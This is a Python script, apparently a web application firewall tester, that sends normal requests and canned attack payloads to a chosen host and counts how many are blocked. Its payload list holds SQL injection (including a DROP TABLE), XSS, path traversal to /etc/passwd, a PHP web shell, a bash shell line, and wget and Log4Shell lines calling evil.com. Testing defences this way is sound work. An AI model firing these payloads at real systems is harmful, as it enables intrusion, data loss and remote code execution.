#!/usr/bin/env python3
import argparse
import requests
import random
import time
import sys
from urllib.parse import urljoin

# Aggressive payloads designed to be caught by any WAF
ATTACK_PAYLOADS = {
    "sqli": [
        "1' OR 1=1 --",
        "admin' --",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "OR 'a'='a'",
        "1; DROP TABLE users"
    ],
    "xss": [
        "<script>alert('WAF_TEST')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg/onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<details open ontoggle=alert(1)>"
    ],
    "lfi_rfi": [
        "../../../../etc/passwd",
        "../../../../boot.ini",
        "/proc/self/environ",
        "http://evil.com/shell.txt",
        "..%2f..%2f..%2fetc/passwd",
        "WEB-INF/web.xml"
    ],
    "rce": [
        "; id",
        "| /bin/bash -i",
        "&& wget http://evil.com/malware",
        "$(whoami)",
        "<?php system($_GET['cmd']); ?>",
        "${jndi:ldap://evil.com/a}" # Log4Shell
    ]
}

LEGIT_PATHS = [
    "/", "/index.html", "/contact", "/about", "/api/v1/health", 
    "/static/css/style.css", "/favicon.ico", "/login"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "WAF-Tester-Bot/1.0"
]

class WAFTester:
    def __init__(self, host, protocol="http", verify_ssl=False):
        self.base_url = f"{protocol}://{host}"
        self.verify_ssl = verify_ssl
        self.stats = {"total": 0, "blocked": 0, "allowed": 0, "error": 0}

    def send_request(self, path, payload=None, is_malicious=False):
        url = urljoin(self.base_url, path)
        params = {"q": payload} if payload else None
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        
        try:
            self.stats["total"] += 1
            response = requests.get(
                url, params=params, headers=headers, 
                timeout=5, verify=self.verify_ssl
            )
            
            status = response.status_code
            if status == 403:
                self.stats["blocked"] += 1
                print(f"[BLOCKED] {status} | Path: {path} | Payload: {payload or 'None'}")
            else:
                self.stats["allowed"] += 1
                print(f"[ALLOWED] {status} | Path: {path} | Payload: {payload or 'None'}")
                
        except Exception as e:
            self.stats["error"] += 1
            print(f"[ERROR] Connection failed: {e}")

    def run_legal(self, count):
        print(f"\n--- Running {count} LEGITIMATE requests ---")
        for _ in range(count):
            self.send_request(random.choice(LEGIT_PATHS))
            time.sleep(0.1)

    def run_illegal(self, count, attack_type="all"):
        print(f"\n--- Running {count} MALICIOUS requests (Type: {attack_type}) ---")
        types = ATTACK_PAYLOADS.keys() if attack_type == "all" else [attack_type]
        for _ in range(count):
            t = random.choice(list(types))
            payload = random.choice(ATTACK_PAYLOADS[t])
            self.send_request("/search", payload=payload, is_malicious=True)
            time.sleep(0.1)

    def print_summary(self):
        print("\n" + "="*30)
        print("WAF TEST SUMMARY")
        print("="*30)
        print(f"Total Requests: {self.stats['total']}")
        print(f"Blocked (403):  {self.stats['blocked']}")
        print(f"Allowed:        {self.stats['allowed']}")
        print(f"Errors:         {self.stats['error']}")
        if self.stats['total'] > 0:
            print(f"Block Rate:     {(self.stats['blocked']/self.stats['total'])*100:.2f}%")
        print("="*30)

def main():
    parser = argparse.ArgumentParser(description="WAF Attack & Traffic Generator")
    parser.add_argument("-u", "--url", required=True, help="Target host (e.g. localhost:8080)")
    parser.add_argument("-p", "--protocol", choices=["http", "https"], default="http", help="Protocol to use")
    parser.add_argument("-m", "--mode", choices=["legal", "illegal", "full"], required=True, 
                        help="Traffic mode: legal only, illegal only, or mixed")
    parser.add_argument("-t", "--type", choices=["all", "sqli", "xss", "lfi_rfi", "rce"], default="all",
                        help="Specific attack type for illegal mode")
    parser.add_argument("-c", "--count", type=int, default=10, help="Number of requests")
    parser.add_argument("--insecure", action="store_true", help="Skip SSL verification (for self-signed certs)")

    args = parser.parse_args()

    tester = WAFTester(args.url, args.protocol, not args.insecure)

    if args.mode == "legal":
        tester.run_legal(args.count)
    elif args.mode == "illegal":
        tester.run_illegal(args.count, args.type)
    elif args.mode == "full":
        tester.run_legal(args.count // 2)
        tester.run_illegal(args.count // 2, args.type)

    tester.print_summary()

if __name__ == "__main__":
    main()